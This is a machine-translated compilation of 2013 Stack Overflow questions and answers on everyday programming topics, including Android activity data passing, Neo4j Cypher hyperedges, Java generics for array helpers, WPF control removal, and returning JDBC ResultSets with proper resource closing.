> 时间：2013-02-19T13:02:19.090

看看这里...创建自定义控件的好教程 [http://www.thinkandbuild.it/how-to-build-a-custom-control-in-ios/?goback=%2Egmp_121874%2Egde_121874_member_214742305](http://www.thinkandbuild.it/how-to-build-a-custom-control-in-ios/?goback=%2Egmp_121874%2Egde_121874_member_214742305)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:26:02.310

1.  [自定义 UITableView](http://howtomakeiphoneapps.com/how-to-design-a-custom-uitableviewcell-from-scratch/1292/)
2.  [自定义 UIView](http://www.raywenderlich.com/1768/how-to-make-a-custom-uiview-a-5-star-rating-view)
3.  [自定义 UIScrollView](http://iky1e.tumblr.com/post/11284574668/tutorial-cool-uiscrollview-effects)
4.  [自定义 UIImageView](http://mobile.tutsplus.com/tutorials/iphone/uiimageview-animation/)
5.  [使用 UILabel 自定义 UITextView](https://stackoverflow.com/questions/14622607/creating-custom-uitextview-with-uilabels-as-well-as-text-in-it)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:28:20.003

检查这个，它将从基本解释。 [http://www.raywenderlich.com/1797/how-to-create-a-simple-iphone-app-tutorial-part-1](http://www.raywenderlich.com/1797/how-to-create-a-simple-iphone-app-tutorial-part-1)

# java - 将数据从活动实时传递到子活动

> ID：14853458
> 
> 赞同：1
> 
> 时间：2013-02-13T12:20:53.310
> 
> 标签：java, android

我有一个带有主要活动的应用程序，一个图形活动和一个蓝牙 ConnectListenerImpl。主活动搜索蓝牙设备，蓝牙 ConnectListenerImpl 与设备连接，并使用 Handler 向主活动发送数据消息。并且主要活动显示数据。

现在我想在作为主要活动的子活动的图形活动中显示数据。子活动的开始。

```
bGrafiekShow = true;
Intent intent = null;
intent = new Intent(MainActivity.this, GraphActivity.class); 
startActivity(intent); 
```

现在是我的问题，我该怎么做，最好的方法是什么？

一点额外的信息。主要活动将来自蓝牙的数据放在其他类中，该类进行一些计算。计算完成后，主要活动将结果显示在屏幕上。

蓝牙设备每秒钟发送一次数据。

现在我想要在子活动的时间图中计算数据图。但是我怎样才能将数据发送到子活动。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:26:14.640

你可以通过数据思考`Activities`

*   如数据图所示`Bundle`
*   用的`putExtra()`方法`Intent`
*   带`Serializable`或`Parceable`接口。

或者你可以使用`ResultReceiver`类。您可以将其与`IntentService`而不是`Handler`. 在`Service`你将做你的工作，任何更新将被发送到`ResultReceiver`接收器将更新`UI`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:38:01.033

将设备 ID 放入您的意图或捆绑中。

```
intent.putExtra("DEVICE_ID", deviceId); 
```

开始您的第二个活动时，检索设备 ID 并通过 ConnectListenerImpl 将您的“子”第二个活动连接到蓝牙。

# html - 根据基线测量计算线高、边距等

> ID：14853459
> 
> 赞同：1
> 
> 时间：2013-02-13T12:21:00.820
> 
> 标签：html, css, web, typography

我已经获得了一组要打开的网页，设计师的其中一个规范是一组从字体基线开始的垂直测量值，即从基线到上面的块的高度是 50 像素，到块低于 30 像素。

如果我知道以像素为单位的字体大小，任何人都可以提出一种计算顶部和底部边距（和/或行高等）的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:45:37.697

line-height CSS 属性可以设置为数值。所以计算的行高将是数值 * 字体大小。如果将行高设置为 1，则行高将等于字体大小。这是一个字体大小的例子：20px

```
div {
font-size: 20px;
padding-bottom: 30px;
padding-top: 30px;
line-height: 1;
} 
```

# jquery - 使用 jquery 从 xml 解析 html 文本

> ID：14853463
> 
> 赞同：0
> 
> 时间：2013-02-13T12:21:08.630
> 
> 标签：jquery, xml

我有一个 xml，它有一个带有一些 html 字符的文本节点：

```
<text>Trobafa assles &lt;b&gt;cheaentrades cona El último tributode la geiad de la  Fa&lt;/b&gt; 
```

当我用 jquery 将其解析为文本时（类似这样）：

```
$(this).parent().find('text').text(); 
```

它将字符显示为这样的文本 ( `"Trobafa assles '<br/>'..."`)。这是对的。但是如果我想解析它并输出为 html 怎么办？

我试过这个：

```
$(this).parent().find('text').html(); 
```

但它根本不起作用......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-29T05:19:10.183

尝试将 XML 文件读取为 HTML：

```
$.ajax({ type: "GET", url: 'file.xml', dataType: "html", success: 
         function(xml) { .... 
```

# jquery - 在jquery中从另一个jsp访问属性值

> ID：14853472
> 
> 赞同：0
> 
> 时间：2013-02-13T12:21:41.597
> 
> 标签：jquery, jsp

我有2个jsp。editAttribute.jsp & securitySetting.jsp

并在表单中有一个隐藏变量，该变量将发布在 editAttribute.jsp （这是一个单独的页面）中。

```
<input type="hidden" name="securitySetting" id="securitySetting" value=""> 
```

并在 securitySetting.jsp(another Page) 中有一些单选选项

我需要根据我在 securitySettings.jsp 中选择的值设置隐藏变量值

```
var sectype = $("input:radio[name='secType']:checked").val();
if (sectype == 'open') {
  $("#securitySetting").val("N");
  console.log("In open" + $("#securitySetting").val());
} else if (sectype == 'restricted') {
  var sg = $("#sgrp").val();
  $("#securitySetting").val(sg);
  console.log("In restricted" + $("#securitySetting").val());
} 
```

但我无法控制`$("#securitySetting")`当前页面中的对象。如何从此处访问 editAttribute 页面的隐藏输入对象。

有什么方法可以做到这一点？？？

# neo4j - 如何编写密码查询来创建超边？

> ID：14853473
> 
> 赞同：0
> 
> 时间：2013-02-13T12:21:50.583
> 
> 标签：neo4j, cypher

我有一张包含优惠和客户的图表。一个客户可以与另一个客户分享一个报价，所以当这种情况发生时，我创建了一个超优势。

(CustomerA)-[:SHARED_OFFER]->(newNode)

(newNode)-[:FOR_OFFER]->(offer)

(newNode)-[:SHARED_WITH]->(customers) （这可以是很多客户）

现在，如果另一个客户 B 与其他人共享相同的报价，我希望创建一个新节点来表示这种关系。有没有办法在一个 Cypher 查询中完成所有这一切？

我在用：

```
start c=node:node_auto_index(name="C1"), o=node:node_auto_index(name="Offer"), sharedCustomer=node:node_auto_index(name="C2")
create unique c-[:SHARED_OFFER]->(sharedOffer)-[:FOR_OFFER]->(o), (sharedOffer)-[:SHARED_WITH]->(sharedCustomer) 
```

这是第一次工作。请参阅控制台：[http](http://console.neo4j.org/r/76no2g) ://console.neo4j.org/r/76no2g 当 C1 与 C2 共享商品时，此查询正确创建了关系。

对 C2 现在与 C3 共享 Offer 的情况执行查询会导致同一节点被重用——这不是我想要的。应该有一个从 C2 创建的具有 SHARED_OFFER 关系的新节点。这是查询：

```
start c=node:node_auto_index(name="C2"), o=node:node_auto_index(name="Offer"), sharedCustomer=node:node_auto_index(name="C3")
create unique c-[:SHARED_OFFER]->(sharedOffer)-[:FOR_OFFER]->(o), (sharedOffer)-[:SHARED_WITH]->(sharedCustomer) 
```

任何帮助表示赞赏。注意：我使用的是 1.8.1 REST，因此尝试一次性完成这一切，而不是部分完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T09:23:57.000

根本不使用`create unique`，而只是`create`. 但请记住首先在 start 子句中指定路径中的所有节点，并`sharedOffer`始终未指定参数，因此 create 命令将仅创建未指定的元素。

**更新**使用`create`而不是`create unique`过滤现有关系（或使用 2 个查询 - 一个用于检查 sharedOffer 是否已存在于 C1 中，第二个用于更新 sharedOffer 与 C3）：

```
START c=node:node_auto_index(name="C1"), o=node:node_auto_index(name="Offer"), sharedCustomer=node:node_auto_index(name="C2")
WHERE not(c-[:SHARED_OFFER]->(sharedOffer)-[:FOR_OFFER]->(o))
CREATE c-[:SHARED_OFFER]->(sharedOffer)-[:FOR_OFFER]->(o), (sharedOffer)-[:SHARED_WITH]->(sharedCustomer) 
```

# php - 关于不同版本 Joomla(3) 的组件或模块的兼容性

> ID：14853474
> 
> 赞同：1
> 
> 时间：2013-02-13T12:22:01.167
> 
> 标签：php

只是我有一个疑问，为什么一个组件或模块与一个版本的 Joomla（Ex-> Joomla 2.5）兼容，但相同的组件或模块与另一个版本的 Joomla（Ex-> Joomla 3.0）不兼容。

如果我想让它与其他版本兼容，那么我需要做些什么改变

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:12:17.670

兼容性的问题是 Joomla！是一个微妙的。

**Joomla！平台/API 一直在发展**（特别是在 1.5 和 2.5 等 LTS 版本之间），因此类/函数被更改或弃用，后来又被删除。添加新的东西等等。

开发人员可以在不同版本下维护组件（我并不是说这很容易），但他们需要知道 API 中发生了什么变化。

也构造像（在伪代码中）

`if (Joomla! version == 1.5) then do this else do that`.

用于确保代码的某些部分仅在特定版本中使用。

为了更好地了解正在发生的事情，请查看：

[**Joomla 3.0 中潜在的向后兼容性问题**](http://docs.joomla.org/Potential_backward_compatibility_issues_in_Joomla_3.0_and_Joomla_Platform_12.1)

你很容易看到：

*   重命名的类
*   删除的类
*   等等

# iphone - iOS 视频无法在移动 Safari 中播放

> ID：14853478
> 
> 赞同：1
> 
> 时间：2013-02-13T12:22:09.817
> 
> 标签：iphone, ios, video-streaming, wifi, 3g-network

我有这个非常烦人的问题，我似乎无法解决。

我们的服务器上有一些短片，我们正试图通过移动 safari 观看这些短片。奇怪的是，当我们的 iPhone 使用 3g 网络时，我们可以在移动设备上观看电影，而不是当我们使用 WiFi 时。

更奇怪的是，我们有时可以在 wifi 上而不是其他时间观看电影。

这是有问题的链接：http: [//bit.ly/Za0xBA](http://bit.ly/Za0xBA)

为什么链接会通过 3g 而不是通过 wifi 播放？那里有一些设置会停止吗？我们甚至尝试通过 iOS 模拟器对连接进行 Wireshark 连接，发生了什么事，看起来视频下载正常。

这让我们发疯！

# php - 编程语言的初学者选择

> ID：14853481
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:22:17.997
> 
> 标签：php, facebook, flash

首先，我很抱歉我的英语，我是法国人......

好吧，我想做一个 facebook 游戏（又是一个）。

我希望我的游戏可以在所有平台或很多平台上玩（网络、Facebook、android、windows phone、win8...）。

但最重要的当然是facebook。

我的问题：哪种语言最适合我的需要？Flash / PHP / Java / Html5 CSS3 ？

谢谢大家，大卫。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:27:02.610

这将取决于您的技能，但我会说，如果您选择基于浏览器的语言，您的安全。我会选择 PHP 和/或 Javascript（HTML5 画布）。

我会把 Flash 放在一边。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:26:15.530

HTML5 和 CSS3 用于显示。他们不能拥有您的业务逻辑。关于 Flash、PHP、Java、Groovy、Ruby on Rails 等……这是知识问题。你知道的编程语言是最好的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:31:48.247

这取决于您想要创建什么类型的游戏，以及您想要/需要什么架构。

但是，iDevice 或更新版本的 Android (4.2+) 不支持 Flash，因此您可能希望远离它。

# php - 反序列化：命名和实现

> ID：14853482
> 
> 赞同：0
> 
> 时间：2013-02-13T12:22:19.660
> 
> 标签：php, serialization

我有一堆对象，我需要能够在 JSON、PHP 等中序列化。我有 JSONSerializer 之类的东西，并且显然有 serialize() 可用。现在我仍然需要对象特定的逻辑来将对象转换为可以提供给 JSONSerializer 或 serialize() 的东西。基本上要么是原始类型，要么是仅包含匹配此条件的元素的数组。

两个问题：

1.  在序列化之前如何调用这一步？“阵列化”？我正在考虑给我的对象一个 toArray() 方法。我还希望他们实现一些指定此方法的接口？有人比“Arrayable”有更好的主意吗？

2.  我怎样才能最好地进行反序列化？我可以在每个对象中有一个静态的 newFromArray 方法。虽然不喜欢静态代码。关于可以从“数组化”构造给定类型对象的工厂有什么意见吗？

注意：这需要与 PHP 5.3 一起使用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-13T22:54:22.103

[Symfony 序列化器组件](http://symfony.com/doc/current/components/serializer.html)为这两个问题提供了一个答案。它将从对象到数组的步骤称为“规范化”和反向的“非规范化”。

对于“反序列化器”或“反规范化器”的构造，我发现创建一个抽象工厂非常有用。它解决了构造问题，并且可以使用户不知道他们正在使用哪个确切的解串器。这方面的一个例子是这个基于[序列化组件的反序列​​化](https://github.com/wmde/Serialization)[器工厂](https://github.com/wmde/Ask/blob/master/src/Ask/DeserializerFactory.php#L24)。

# java - 这可以是通用的吗

> ID：14853489
> 
> 赞同：2
> 
> 时间：2013-02-13T12:22:43.493
> 
> 标签：java, generics

嗨，我组成了这个类来添加到字符串数组并从中删除元素。我还做了一个准备一组值以写入 csv 文件的方法。但是我想这样做，以便它接受任何值（对于前两种方法，因为最后一种方法总是一个字符串）我如何使它成为通用的呢？并且 ps 我知道我不应该为 csv 构建器发送二维参数，但我现在才知道如何获取行维度。:)

```
public class ManipulateList {

    public static String [] removeFromArray(String []old_array,int index) {

        String []old_vals = old_array;
        int old_length= old_vals.length;
        int new_length= old_length-1;
        String[] new_vals = new String[new_length];
        System.arraycopy(old_vals, 0, new_vals, 0, index); 
        if(index+1!=old_length) {
            System.arraycopy(old_vals, index+1, new_vals,index,old_length-1-index);
        }
        return new_vals;

    }

    public static String[] addToArray(String []old_array,String element) {

        String new_element=element;
        String[] old_vals = old_array;
        int old_length= old_vals.length;
        int new_length= old_length+1;
        String[] new_vals = new String[new_length];
        System.arraycopy(old_vals, 0, new_vals, 0, old_length);
        new_vals[old_length]=new_element; 
        return new_vals;
    }

    public static String[] createCsvList(String[][] lists, int contents1,int contents2){
        String[][] csvarray=new String[contents1][contents2];
        csvarray = lists;
        String[]newcsv=new String[contents2];
        StringBuilder newline = new StringBuilder();

        for (int i = 0; i<contents2;i++) {
            for (int j = 0; j<contents1;j++) {
                newline.append(csvarray[j][i]);
                if(contents1-j>1) {
                    newline.append(",");
                }
            }
            newcsv[i]=newline.toString();
            newline= new StringBuilder();
        }
        return newcsv;
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:25:27.310

差不多，用 T[] 替换 String[] 就完成了。

这是第一个。您会注意到，我大多只是替换`String[]`并`T[]`添加`<T>`到方法签名中。

```
public static <T> T[] removeFromArray(T[] old_array,int index)
{

    T[] old_vals = old_array;
    int old_length = old_vals.Length;
    int new_length = old_length - 1;
    @SuppressWarnings("unchecked") T[] new_vals = (T[]) Array.newInstance(old_array.getClass().getComponentType(), new_length);
    System.arraycopy(old_vals, 0, new_vals, 0, index); 
    if(index + 1 != old_length)
    {
        System.arraycopy(old_vals, index+1, new_vals, index,old_length - 1 - index);
    }

    return new_vals;
} 
```

编辑：

显然，要创建一个新数组，必须这样做：

```
public T[] createArray(Class<T> cls, int size) throws Exception   
{   
    @SuppressWarnings("unchecked") T[] array = (T[])Array.newInstance(cls, size);   
    return array;   
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:32:36.057

It would be better to use a List, or better yet, an object containing a List, instead of a String[]. Then you would not have to write your own methods to add elements to arrays.

If you really want to use arrays for some reason, it's fairly difficult, since the following is illegal:

```
T[] myNewList = new T[]; 
```

The compiler does not have the information at runtime to know what T is when you're calling the method (due to type erasure). You can fake it in various ways such as using ArrayList.toArray(), but I'd just avoid the problem entirely and use Lists, as mentioned above.

However, for CSV, I'm not sure why you would want anything except for Strings anyway. CSV files are effectively lists of lists of strings.

# azure - 会话过期问题：Azure Thinktecture Identity Server 单点登录

> ID：14853491
> 
> 赞同：0
> 
> 时间：2013-02-13T12:22:46.193
> 
> 标签：azure, asp.net-mvc-4, claims-based-identity, thinktecture-ident-server

使用 ThinkTecture Identity 服务器 API 设计的登录站点。登录站点和客户站点作为 Azure WebRoles 托管。

成功登录后，重定向到客户站点。在这里，我得到了登录用户。

```
var emaild = System.Web.HttpContext.Current.User.Identity.Name. 
```

几个小时后，我检查了该站点，但我仍然获得了登录用户。我不知道这个当前用户会话什么时候会过期？如果有人知道，请分享您的看法。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T16:59:03.410

默认情况下，会话具有与初始令牌相同的生命周期 - 默认情况下为 10 小时。您可以在 idsrv 配置中更改它。

# javascript - Mongoosejs：如何将节点验证器对象传递给查询的回调函数

> ID：14853494
> 
> 赞同：0
> 
> 时间：2013-02-13T12:22:59.933
> 
> 标签：javascript, mongoose

我正在努力尝试将变量/函数传递给猫鼬查询回调函数。

我想要做的是： **编辑：**标题已更改并重新定义示例

```
Validator.protoptype.customCheck = function(model, path) {

  var self = this // validator object {msg: 'msg', error: ...};

  model.find({name: 'john'}, function(err, res) {
    if (res.length === 0) {
      self.error( self.msg ) // msg hasn't the expected value. 
      // As I have some other validators after this callback gets executed
      // the context is different. don't know how to pass the right context
    } else {
      // something else ...
    }
  }
} 
```

# jsp - 通过jsp设置cookie

> ID：14853495
> 
> 赞同：0
> 
> 时间：2013-02-13T12:23:06.653
> 
> 标签：jsp, cookies

当我使用以下代码通过 JSP 设置 cookie 时：

```
String username = userinfoid;
Cookie testcoo  = new Cookie ("username",username); 
```

它使用值“zahidansari”设置cookie（注意值是双引号）。尽管值是正确的，但它被限制在双引号内。

但是，当我使用以下代码设置 cookie 时：

```
Cookie testcoo  = new Cookie ("username",username); 
```

它正在设置没有引号的cookie。

我希望 cookie 值不带引号。有谁知道为什么会这样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-12T13:10:45.250

刚遇到同样的问题。不要让这个问题悬而未决:)这是我的解决方法：

编码 cookie 值：

```
String username = userinfoid;
Cookie testcoo  = new Cookie ("username", URLEncoder.encode(username, "UTF-8")); 
```

有关更多信息，请查看[其他 SO 问题](https://stackoverflow.com/questions/572482/why-do-cookie-values-with-whitespace-arrive-at-the-client-side-with-quotes)

# actionscript-3 - 如何在flex中使用对象代理？

> ID：14853496
> 
> 赞同：0
> 
> 时间：2013-02-13T12:23:07.297
> 
> 标签：actionscript-3, apache-flex, flex4.5

嗨，这里有一些我必须阅读和理解的代码，所以任何人都可以解释一下对象代理的作用以及有什么好处，因为只是格式化它？

```
 override public function set currentResult(value:ArrayCollection):void
    {
        super.currentResult = value;
        dispatch(new doEvent(getFormatData(value)));
    }

    private static function getFormat(ddList:ArrayCollection):ArrayCollection
    {
        var formattedArr:ArrayCollection = new ArrayCollection();
        for each(var obj:Object in ddList)
            formattedArr.addItem(new ObjectProxy(obj));

        return formattedArr;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:33:27.190

ObjectProxy 提供了跟踪对此代理管理的项目的更改的能力。通过使用 addEventListener() 方法，任何数量的对象都可以“侦听”此对象的更改。使用 [此](http://blog.flexexamples.com/2007/09/27/detecting-changes-to-an-object-using-the-flex-objectproxy-class/) 方法更清楚。

# wpf - 如何在wpf中删除用户控件

> ID：14853498
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:23:22.317
> 
> 标签：wpf, user-controls

我有包含多个用户控件的 GroupBox，每个用户控件都有删除按钮，请指导我如何在单击删除按钮时删除用户控件

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T14:20:48.807

```
<UserControl x:Class="WpfApplication1.UserControl1"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008"  Height="60" Width="150">
<Grid>
    <Border BorderThickness="2" BorderBrush="Red" Background="Black">
        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
                <RowDefinition Height="*"/>

            </Grid.RowDefinitions>
            <TextBlock Text="Abcd" Background="Red"/>
    <Button Content="Delete" Grid.Row="1" Click="Button_Click"/>
        </Grid>
    </Border>
</Grid> 
```

```
 public partial class UserControl1 : UserControl
{
    public UserControl1()
    {
        InitializeComponent();
    }

    public Action Delete;

    private void Button_Click(object sender, RoutedEventArgs e)
    {
        if(Delete!=null)
            Delete();
    }

}

<Window x:Class="WpfApplication1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:uc="clr-namespace:WpfApplication1"
    xmlns:local="clr-namespace:WpfApplication1"
    Width="1000" Height="1000"
    Title="MainWindow"   x:Name="abc">
<Grid>
    <GroupBox Header="Group">
        <GroupBox.Content>
            <Grid x:Name="LayoutRoot">
                <Grid.RowDefinitions>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="*"/>
                </Grid.RowDefinitions>
                <local:UserControl1 x:Name="uc1"/>
                <local:UserControl1 x:Name="uc2" Grid.Row="1"/>
            </Grid>
        </GroupBox.Content>
    </GroupBox>
</Grid> 
```

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        DataContext = this;
        uc2.Delete += OnDelete;
    }
    private void OnDelete()
    {
        LayoutRoot.Children.Remove(uc2);
    }
} 
```

我希望这能帮到您。

# facebook - 将 Facebook like XFBML 按钮与 Pinterest 按钮对齐

> ID：14853500
> 
> 赞同：1
> 
> 时间：2013-02-13T12:23:23.707
> 
> 标签：facebook, facebook-like, styling, pinterest

我知道以前有人问过类似的问题，但我对此很陌生，无法理解。我相当确定这是一项简单的任务，但我做不到。

我正在使用我目前无法访问 css 模板的 CMS。

我想要的只是使用 html 源代码编辑器将 Pinterest 按钮和类似 facebook 的按钮添加到我的个人产品页面中。目前，它们显示一个在另一个之下。

这些是代码：

```
<a data-pin-config="above" href="//pinterest.com/pin/create/button/" data-pin-do="buttonBookmark">
  <img src="//assets.pinterest.com/images/pidgets/pin_it_button.png" />
</a>

<fb:like send="true" layout="button_count" width="100" show_faces="false"></fb:like> 
```

如何编写正确的样式代码来实现这一点？

# java - 返回一个结果集

> ID：14853508
> 
> 赞同：24
> 
> 时间：2013-02-13T12:23:49.060
> 
> 标签：java, mysql, jdbc

我正在尝试创建一种方法，可以从中查询我的数据库并检索整个表。

*目前，如果我在*方法中使用数据，它就可以正常工作。但是，我希望该方法返回结果。

我正在`java.sql.SQLException: Operation not allowed after ResultSet closed`了解当前的代码。

我怎样才能做到这一点？

```
public ResultSet select() {

    con = null;
    st = null;
    rs = null;

    try {
        con = DriverManager.getConnection(url, user, password);
        st = con.createStatement();

        rs = st.executeQuery("SELECT * FROM biler");
        /*
        if (rs.next()) {
            System.out.println(rs.getString("model"));
        }*/

    } catch (SQLException ex) {
        Logger lgr = Logger.getLogger(MySQL.class.getName());
        lgr.log(Level.SEVERE, ex.getMessage(), ex);

    } finally {
        try {
            if (rs != null) {
                rs.close();
            }
            if (st != null) {
                st.close();
            }
            if (con != null) {
                con.close();
            }

        } catch (SQLException ex) {
            Logger lgr = Logger.getLogger(MySQL.class.getName());
            lgr.log(Level.WARNING, ex.getMessage(), ex);
        }
    }

    return rs;
} 
```

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2013-02-13T12:30:17.827

你永远不应该`ResultSet`通过公共方法传递。这很容易导致资源泄漏，因为您被迫保持语句和连接打开。关闭它们将隐式关闭结果集。但是保持它们打开会导致它们晃来晃去，并导致数据库在打开太多资源时耗尽资源。

像这样将它映射到 Javabeans 的集合并返回它：

```
public List<Biler> list() throws SQLException {
    Connection connection = null;
    PreparedStatement statement = null;
    ResultSet resultSet = null;
    List<Biler> bilers = new ArrayList<Biler>();

    try {
        connection = database.getConnection();
        statement = connection.prepareStatement("SELECT id, name, value FROM Biler");
        resultSet = statement.executeQuery();

        while (resultSet.next()) {
            Biler biler = new Biler();
            biler.setId(resultSet.getLong("id"));
            biler.setName(resultSet.getString("name"));
            biler.setValue(resultSet.getInt("value"));
            bilers.add(biler);
        }
    } finally {
        if (resultSet != null) try { resultSet.close(); } catch (SQLException ignore) {}
        if (statement != null) try { statement.close(); } catch (SQLException ignore) {}
        if (connection != null) try { connection.close(); } catch (SQLException ignore) {}
    }

    return bilers;
} 
```

或者，如果您已经使用 Java 7，只需使用[try-with-resources](http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html)语句，它会自动关闭这些资源：

```
public List<Biler> list() throws SQLException {
    List<Biler> bilers = new ArrayList<Biler>();

    try (
        Connection connection = database.getConnection();
        PreparedStatement statement = connection.prepareStatement("SELECT id, name, value FROM Biler");
        ResultSet resultSet = statement.executeQuery();
    ) {
        while (resultSet.next()) {
            Biler biler = new Biler();
            biler.setId(resultSet.getLong("id"));
            biler.setName(resultSet.getString("name"));
            biler.setValue(resultSet.getInt("value"));
            bilers.add(biler);
        }
    }

    return bilers;
} 
```

顺便说一句，您根本不应该将`Connection`,`Statement`和声明`ResultSet`为实例变量（主要的线程安全问题！），也不应该`SQLException`在此时吞下 （调用者不知道发生了问题），也不应该关闭相同的资源`try`（例如，如果结果集关闭引发异常，则语句和连接仍然打开）。所有这些问题都在上面的代码片段中得到修复。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-02-13T12:59:48.597

如果您在检索时间时不知道您想要什么 ResultSet 我建议将完整的东西映射到这样的地图中：

```
 List<Map<String, Object>> resultList = new ArrayList<Map<String, Object>>();
    Map<String, Object> row = null;

    ResultSetMetaData metaData = rs.getMetaData();
    Integer columnCount = metaData.getColumnCount();

    while (rs.next()) {
        row = new HashMap<String, Object>();
        for (int i = 1; i <= columnCount; i++) {
            row.put(metaData.getColumnName(i), rs.getObject(i));
        }
        resultList.add(row);
    } 
```

所以基本上你有与 ResultSet 相同的东西（没有 ResultSetMetaData）。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-02-13T12:26:08.183

好吧，你**确实**调用`rs.close()`了你的`finally`-block。

这*基本上*是一个好主意，因为您应该关闭所有资源（连接、语句、结果集......）。

*但是*你必须在使用它们*后关闭它们。*

至少有三种可能的解决方案：

1.  不要关闭结果集（和连接，......）并要求调用者调用单独的“关闭”方法。

    这基本上意味着现在*调用者*需要记住调用 close 并没有真正让事情变得更容易。

2.  让调用者传入一个通过结果集的类并在您的方法中调用它

    这可行，但可能会变得有点冗长，因为对于要在结果集上执行的每个代码块，您都需要某个接口的子类（可能作为匿名内部类）。

    界面如下所示：

    ```
    public interface ResultSetConsumer<T> {
      public T consume(ResultSet rs);
    } 
    ```

    你的`select`方法看起来像这样：

    ```
    public <T> List<T> select(String query, ResultSetConsumer<T> consumer) {
      Connection con = null;
      Statement st = null;
      ResultSet rs = null;

        try {
          con = DriverManager.getConnection(url, user, password);
          st = con.createStatement();

          rs = st.executeQuery(query);
          List<T> result = new ArrayList<T>();
          while (rs.next()) {
              result.add(consumer.consume(rs));
          }
        } catch (SQLException ex) {
          // logging
        } finally {
          try {
            if (rs != null) {
                rs.close();
            }
            if (st != null) {
                st.close();
            }
            if (con != null) {
                con.close();
            }
          } catch (SQLException ex) {
            Logger lgr = Logger.getLogger(MySQL.class.getName());
            lgr.log(Level.WARNING, ex.getMessage(), ex);
          }
        }
      return rs;
    } 
    ```

3.  完成方法内的所有工作`select`并返回一些`List`结果。

    这可能是最广泛使用的一种：遍历结果集并将数据转换为您自己的 DTO 中的自定义数据并返回*那些*.

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-06-21T18:20:12.847

正如我之前的每个人都说通过结果集是个坏主意。如果您使用像[c3p0](http://www.mchange.com/projects/c3p0/)这样的连接池库，那么您可以安全地使用[CachedRowSet](http://docs.oracle.com/javase/6/docs/api/javax/sql/rowset/CachedRowSet.html)及其实现[CachedRowSetImpl](http://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/CachedRowSetImpl.html)。使用它可以关闭连接。它只会在需要时使用连接。这是java文档的片段：

> CachedRowSet 对象是一个断开连接的行集，这意味着它仅短暂地使用到其数据源的连接。它在读取数据以用行填充自身时连接到其数据源，并在将更改传播回其底层数据源时再次连接。其余时间，CachedRowSet 对象断开连接，包括在修改其数据时。断开连接使 RowSet 对象更精简，因此更容易传递给另一个组件。例如，可以对断开连接的 RowSet 对象进行序列化并通过线路传递给瘦客户端，例如个人数字助理 (PDA)。

下面是查询和返回 ResultSet 的代码片段：

```
public ResultSet getContent(String queryStr) {
    Connection conn = null;
    Statement stmt = null;
    ResultSet resultSet = null;
    CachedRowSetImpl crs = null;
    try {
        Connection conn = dataSource.getConnection();
        stmt = conn.createStatement();
        resultSet = stmt.executeQuery(queryStr);

        crs = new CachedRowSetImpl();
        crs.populate(resultSet);
    } catch (SQLException e) {
        throw new IllegalStateException("Unable to execute query: " + queryStr, e);
    }finally {
        try {
            if (resultSet != null) {
                resultSet.close();
            }
            if (stmt != null) {
                stmt.close();
            }
            if (conn != null) {
                conn.close();
            }
        } catch (SQLException e) {
            LOGGER.error("Ignored", e);
        }
    }

    return crs;
} 
```

下面是使用 c3p0 创建数据源的代码片段：

```
 ComboPooledDataSource cpds = new ComboPooledDataSource();
            try {
                cpds.setDriverClass("<driver class>"); //loads the jdbc driver
            } catch (PropertyVetoException e) {
                e.printStackTrace();
                return;
            }
            cpds.setJdbcUrl("jdbc:<url>");
            cpds.setMinPoolSize(5);
            cpds.setAcquireIncrement(5);
            cpds.setMaxPoolSize(20);

 javax.sql.DataSource dataSource = cpds; 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-03-17T15:52:47.900

您可以使用 CachedRowSet 对象来满足您的需求：

```
public CachedRowSetImpl select(String url, String user, String password) {

    CachedRowSetImpl crs = null;

    try (Connection con = DriverManager.getConnection(url, user, password);
         Statement st = con.createStatement();
         ResultSet rs = st.executeQuery("SELECT * FROM biler");) {

        crs = new CachedRowSetImpl();
        crs.populate(rs);

    } catch (SQLException ex) {
        Logger lgr = Logger.getLogger(MySQL.class.getName());
        lgr.log(Level.SEVERE, ex.getMessage(), ex);

    } catch (SQLException ex) {
        Logger lgr = Logger.getLogger(MySQL.class.getName());
        lgr.log(Level.WARNING, ex.getMessage(), ex);
    }

    return crs;
} 
```

